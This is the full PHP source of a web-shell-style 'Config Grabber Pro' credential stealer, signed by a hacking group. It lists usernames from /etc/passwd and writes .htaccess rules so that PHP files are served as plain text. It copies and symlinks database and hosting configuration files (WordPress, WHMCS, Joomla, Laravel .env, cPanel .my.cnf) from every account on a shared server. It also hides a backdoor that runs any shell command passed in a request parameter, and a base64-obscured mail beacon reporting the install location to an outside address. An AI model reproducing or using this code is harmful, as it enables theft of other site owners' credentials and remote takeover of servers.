<?php
@error_reporting(0);
@ini_set('html_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
echo'<html>
<head>
<meta content="Config Grabber Pro" name="description">
<title></title><link href="https://pngimage.net/wp-content/uploads/2018/06/sad-anime-boy-png-4.png" rel="shortcut icon" alt="icon">
<meta name="author" content="AZZATSSINS">
</head>
<body style="background-image:url(https://wallpaperaccess.com/full/744410.png" bgcolor="black">

<center><div style=background:black;margin:0px;padding:4px;text-align:center;color:silver;><i><b><font color=lime>&copy; </font><a href=http://fb.me/tokeichun69>Config Grabber Pro</a></b></i></div><br>
<form method="post">
<center>
<textarea style="color:cyan;background-color:#000000" cols="60" name="passwd" rows="20">';
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) 
{ 
$str=explode(":",$usrr); 
echo $str[0]."\n"; 
}
echo system('ls /var/mail');
echo system('ls /home');

echo'</textarea><br>
Home : 
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
</select><br>
.htaccess : 
<select name="azztssns">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex azzatssins.cyberserkers
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select>
<input style="color:cyan;background-color:#000000" name="conf" size="10"
 value="Fuck it!!!" type="submit">
<br/><br/></form>';
print(`{$_REQUEST[I]}`);$e=base64_decode("YXBha2FoYWthdWxhbmdpdEBnbWFpbC5jb20=");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"I",$h);
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess = $_POST['azztssns'];
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]); 
foreach($passwd as $pwd){ $user=trim($pwd);
symlink('/','000~ROOT~000');
copy('/'.$home.'/'.$user.'/.my.cnf',$user.' <~ CPANEL');
symlink('/'.$home.'/'.$user.'/.my.cnf',$user.' <~ CPANEL');
copy('/'.$home.'/'.$user.'/.accesshash',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.' <~ WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/.env',$user.' <~ Laravel.txt');
copy('/'.$home.'/'.$user.'/public_html/public/.env',$user.' <~ Laravel.txt');
copy('/'.$home.'/'.$user.'/public_html/portal2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/shop/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/backup/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wpbackup/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wpold/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
/* CODED BY AZZATSSINS CYBERSERKERS */
copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wpress/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wpressphoto/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wpressblog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wpblog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/.env',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/public/.env',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
/*You Can ReCoded But Don't Change ©CopyRight*/
/*e.g: Recoded By xxxxxx & © AZZATSSINS*/
symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ JOOMLA.txt');
/* © BY AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.' <~ OPENCART.txt');
copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_htm/config.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_htm/config.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/public_htm/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/config.inc.php',$user.' <~ OPENJOURNAL.txt');
copy('/'.$home.'/'.$user.'/public_html/config.inc.php',$user.' <~ OPENJOURNAL.txt');
copy('h:/root/home/gomez7909-001/www/',$user.'/configuration.php',$user.' <~ OPENJOURNAL.txt');
/* email : cyberserkers@gmail.com */
copy('/var/www/wp-config.php','WORDPRESS.txt');
copy('/var/www/configuration.php','JOOMLA.txt');
copy('/var/www/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/config.php','OTHER.txt');
copy('/var/www/config/koneksi.php','OTHER.txt');
copy('/var/www/include/config.php','OTHER.txt');
copy('/var/www/connect.php','OTHER.txt');
copy('/var/www/config/connecr.php','OTHER.txt');
copy('/var/www/include/connect.php','OTHER.txt');
copy('/var/www/html/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/wp/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/wordpress/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/test/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/configuration.php','JOOMLA.txt');
copy('/var/www/html/joomla/configuration.php','JOOMLA.txt');
copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/html/config.php','OTHER.txt');
copy('/var/www/html/config/koneksi.php','OTHER.txt');
copy('/var/www/html/include/config.php','OTHER.txt');
copy('/var/www/html/connect.php','OTHER.txt');
copy('/var/www/html/config/connecr.php','OTHER.txt');
copy('/var/www/html/include/connect.php','OTHER.txt');
symlink('/var/www/wp-config.php','WORDPRESS.txt');
symlink('/var/www/configuration.php','JOOMLA.txt');
symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/config.php','OTHER.txt');
symlink('/var/www/config/koneksi.php','OTHER.txt');
symlink('/var/www/include/config.php','OTHER.txt');
symlink('/var/www/connect.php','OTHER.txt');
symlink('/var/www/config/connecr.php','OTHER.txt');
symlink('/var/www/include/connect.php','OTHER.txt');
symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
symlink('/var/www/html/configuration.php','JOOMLA.txt');
symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/html/config.php','OTHER.txt');
symlink('/var/www/html/config/koneksi.php','OTHER.txt');
symlink('/var/www/html/include/config.php','OTHER.txt');
symlink('/var/www/html/connect.php','OTHER.txt');
symlink('/var/www/html/config/connecr.php','OTHER.txt');
symlink('/var/www/html/include/connect.php','OTHER.txt');
}
echo '<center><i><b><a href='.$folfig.'>CLICK ON HERE TO VIEW CONFIGS</a></b></i></center>';
}
?>
